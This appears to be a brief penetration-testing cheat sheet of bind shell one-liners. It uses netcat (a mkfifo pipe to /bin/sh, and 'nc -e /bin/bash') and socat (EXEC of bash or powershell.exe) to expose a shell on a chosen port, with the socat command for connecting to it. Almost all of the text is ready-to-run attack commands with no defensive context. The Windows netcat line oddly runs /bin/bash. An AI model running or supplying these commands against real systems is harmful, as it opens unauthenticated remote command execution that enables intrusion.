
### Netcat

linux
```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
than connect with nc from your local 

windows
```
nc -lnvp <PORT> -e /bin/bash
```


### Socat 
linux 
```
socat TCP-L:<PORT> EXEC:"bash -li"
```

Windows
``socat TCP-L:<PORT> EXEC:powershell.exe,pipes``

and to connect
`socat TCP:<TARGET-IP>:<TARGET-PORT> -`
mind the trailing '-', since socat always needs two addresses to bind.

